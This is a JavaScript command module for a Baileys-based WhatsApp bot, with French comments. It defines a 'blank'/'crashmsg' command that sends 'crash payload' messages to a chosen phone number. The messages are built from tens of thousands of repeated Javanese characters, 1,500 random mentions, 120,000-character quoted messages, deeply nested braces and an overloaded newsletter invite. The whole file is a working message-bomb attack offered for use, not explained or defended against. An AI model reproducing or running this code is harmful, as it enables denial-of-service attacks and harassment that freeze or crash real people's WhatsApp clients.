import { prepareWAMessageMedia } from "@whiskeysockets/baileys";

export default {
  name: "blank",
  alias: ["blankhard", "crashmsg"],
  description: "Envoie une charge utile lourde et complexe",
  category: "BUG",
  group: false, // Peut s'utiliser en privé ou en groupe selon le besoin
  admin: false,
  botAdmin: false,
  ownerOnly: true,

  async execute(kaya, mek, from, args, prefix) {
    try {
      // 🔐 Récupération sécurisée de l'ID du propriétaire du bot
      const ownerId = kaya.user?.id ? kaya.user.id.split(':')[0] : '';
      if (!ownerId) {
        return await kaya.sendMessage(from, { text: "❌ Erreur : Impossible de récupérer l'ID du propriétaire du bot." }, { quoted: mek });
      }

      // Cible : Soit le salon actuel, soit un utilisateur mentionné/fourni en argument
      const target = args[0] ? args[0] + "@s.whatsapp.net" : from;

      // 1. Préparation du média avec une image de secours / par défaut
      const media = await prepareWAMessageMedia(
        { image: { url: "https://files.catbox.moe/g3w96d.jpg" } },
        { upload: kaya.waUploadToServer }
      ).catch(() => null);

      // 2. Première charge : Extended Text Message surchargée
      const heavyTextMsg = {
        extendedTextMessage: {
          text: "⚠️ CRASH PAYLOAD ACTIVE ⚠️" + "ꦾ".repeat(12000),
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1500 },
                () => `${Math.floor(Math.random() * 899999999 + 100000000)}@s.whatsapp.net`
              )
            ],
            stanzaId: kaya.generateMessageTag(),
            participant: target,
            quotedMessage: {
              conversation: "ꦾ".repeat(120000)
            },
            remoteJid: target
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              payload: "{".repeat(25000),
              nested: Array(500).fill("A".repeat(1000))
            })
          }
        }
      };

      await kaya.relayMessage(target, heavyTextMsg, {
        messageId: kaya.generateMessageTag()
      });

      // 3. Deuxième charge : Newsletter / Bot Invoke piégé et surchargé
      const newsletterMsg = {
        botInvokeMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363229235889246@newsletter",
              newsletterName: "Crash Engine Extreme",
              jpegThumbnail: media?.imageMessage || null,
              caption: "ꦾ".repeat(8000),
              inviteExpiration: Date.now() + 999999999999
            }
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(30000)
        },
        contextInfo: {
          remoteJid: target,
          participant: target,
          stanzaId: kaya.generateMessageTag(),
          quotedMessage: {
            conversation: "ꦾ".repeat(120000)
          },
          externalAdReply: {
            title: "SYSTEM OVERLOAD",
            body: "ꦾ".repeat(5000),
            mediaType: 1,
            thumbnailUrl: "https://files.catbox.moe/g3w96d.jpg",
            sourceUrl: "https://whatsapp.com"
          }
        }
      };

      await kaya.relayMessage(target, newsletterMsg, {
        messageId: kaya.generateMessageTag()
      });

      // Retour discret ou confirmation minimale
      await kaya.sendMessage(from, { text: "⚡ Charge utile lourde envoyée avec succès !" }, { quoted: mek });

    } catch (err) {
      console.error("❌ Erreur dans la commande blank :", err);
      await kaya.sendMessage(from, { text: `Erreur d'exécution : ${err.message}` }, { quoted: mek });
    }
  }
};
